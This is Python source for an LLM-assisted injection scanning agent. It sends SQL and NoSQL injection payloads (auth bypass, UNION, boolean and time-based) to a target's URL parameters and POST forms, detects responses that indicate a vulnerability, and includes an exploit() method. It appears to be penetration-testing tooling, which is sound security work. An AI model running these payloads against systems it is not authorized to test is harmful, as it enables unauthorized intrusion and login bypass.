"""Injection Attack Agent — SQL, NoSQL, Command, SSTI 💉"""
from briar.agents.analyzer import SecurityAnalyzer
from briar.core.http import HTTPClient
from briar.core.params import INJECTION as INJECTION_PARAMS, merge_params

class InjectionAgent:
    """Discovers injection vulnerabilities with real payloads"""

    SQL_PAYLOADS = [
        ("' OR '1'='1", "auth_bypass"),
        ("' OR 1=1--", "auth_bypass"),
        ("' OR '1'='1' --", "auth_bypass"),
        ("' UNION SELECT NULL--", "union"),
        ("' UNION SELECT NULL,NULL--", "union"),
        ("1' AND 1=1--", "boolean_true"),
        ("1' AND 1=2--", "boolean_false"),
        ("' OR SLEEP(3)--", "time_based"),
        ("'; WAITFOR DELAY '00:00:03'--", "time_based"),
        ("' OR pg_sleep(3)--", "time_based"),
        ('{"$gt":""}', "nosql"),
        ("' OR '1'='1' #", "auth_bypass"),
    ]

    def __init__(self, provider="ollama"):
        self.analyzer = SecurityAnalyzer(provider)
        self.http = HTTPClient(timeout=10)
        self.name = "Injection"

    def scan(self, url: str, params: list = None, forms: list = None, tech_context: str = "", **kwargs) -> dict:
        """Scan for injection vulnerabilities with real payloads"""
        findings = []
        params = params or merge_params(url, INJECTION_PARAMS)

        test_params = params[:12]
        errors = ["sql", "mysql", "postgresql", "ora-", "syntax error",
                  "unclosed quotation", "microsoft ole db", "odbc driver"]
        # Per-param baseline (benign value) — all fetched in parallel
        base_res = self.http.batch_send(url, [(p, "1") for p in test_params])
        baselines = {}
        for p, r in zip(test_params, base_res):
            baselines[p] = (r.get("length", 0), r.get("time", 0.5)) if r and "error" not in r else (0, 0.5)
        # Fire every (param, payload) concurrently instead of 144 in series
        meta = [(p, pl, vt) for p in test_params for pl, vt in self.SQL_PAYLOADS]
        results = self.http.batch_send(url, [(p, pl) for p, pl, _ in meta])
        hit = set()
        for (param, payload, vuln_type), result in zip(meta, results):
            if param in hit or not result or "error" in result:
                continue
            bl_len, bl_time = baselines.get(param, (0, 0.5))
            detected, detection = False, ""
            snippet = result.get("text_snippet", "").lower()
            for e in errors:
                if e in snippet:
                    detected, detection = True, f"error_based ({e})"
                    break
            if not detected and abs(result["length"] - bl_len) > 100:
                detected, detection = True, f"boolean_based (len diff: {abs(result['length'] - bl_len)})"
            if not detected and self.http.detect_time_based(result["time"], bl_time):
                confirm = self.http.send_payload(url, param, payload)
                if "error" not in confirm and self.http.detect_time_based(confirm.get("time", 0), bl_time):
                    detected, detection = True, f"time_based (confirmed {result['time']:.1f}s)"
            if detected:
                findings.append({
                    "type": f"SQL Injection ({vuln_type})",
                    "severity": "Critical" if vuln_type != "boolean_false" else "High",
                    "param": param, "payload": payload, "detection": detection,
                    "status": result["status"], "length": result["length"],
                    "time": round(result["time"], 2),
                })
                hit.add(param)  # one finding per param

        # POST form testing — login SQLi etc. live in form fields, not URL params.
        # Only on the base URL run (no query) so a form isn't re-tested per endpoint.
        from urllib.parse import urlparse as _up
        recon_data = kwargs.get("recon_data") or {}
        test_forms = [] if _up(url).query else (forms or recon_data.get("forms") or [])
        for form in test_forms[:6]:
            if str(form.get("method", "GET")).upper() != "POST":
                continue
            action = form.get("action") or url
            inputs = [i for i in (form.get("inputs") or []) if i][:6]
            hit = False
            for field in inputs:
                for payload, vuln_type in self.SQL_PAYLOADS[:6]:
                    try:
                        data = {i: "test" for i in inputs}
                        data[field] = payload
                        resp = self.http.post(action, data=data)
                        if self.http.detect_error(resp.text[:1000]):
                            findings.append({
                                "type": f"SQL Injection ({vuln_type}) [POST form]",
                                "severity": "Critical", "param": field, "payload": payload,
                                "method": "POST", "url": action,
                                "detection": "error_based (POST form)", "status": resp.status_code,
                            })
                            hit = True
                            break
                    except Exception:
                        pass
                if hit:
                    break

        # Build analysis text
        analysis = f"Injection scan complete for {url}\n\n"
        if findings:
            analysis += f"**{len(findings)} potential injection points found:**\n\n"
            for f in findings:
                analysis += f"- **{f['param']}**: {f['type']} — {f['detection']} (payload: `{f['payload']}`)\n"
            analysis += "\n---\n\nLLM analysis of real findings:\n"
            llm_result = self.analyzer.analyze_endpoint(url, "GET/POST", analysis, tech_context=tech_context)
            llm_result["real_findings"] = findings
            llm_result["agent"] = self.name
            llm_result["type"] = "Injection"
            llm_result["severity"] = "Critical" if any(f["severity"] == "Critical" for f in findings) else "High"
            return llm_result
        else:
            analysis += "No injection vulnerabilities detected with automated payloads.\n\nLLM analysis:\n"
            result = self.analyzer.analyze_endpoint(url, "GET/POST", analysis, tech_context=tech_context)
            result["real_findings"] = findings
            result["agent"] = self.name
            result["type"] = "Injection"
            result["severity"] = "Info"
            return result

    def exploit(self, url: str, vuln_type: str, payload: str) -> dict:
        """Attempt to exploit an injection vulnerability"""
        from urllib.parse import urlparse, urlunparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            result = self.http.send_payload(url, param, payload)
            if "error" not in result and result["status"] == 200:
                return {"url": url, "type": vuln_type, "payload": payload,
                        "status": "exploited", "response_len": result["length"]}
        return {"url": url, "type": vuln_type, "payload": payload, "status": "no_effect"}
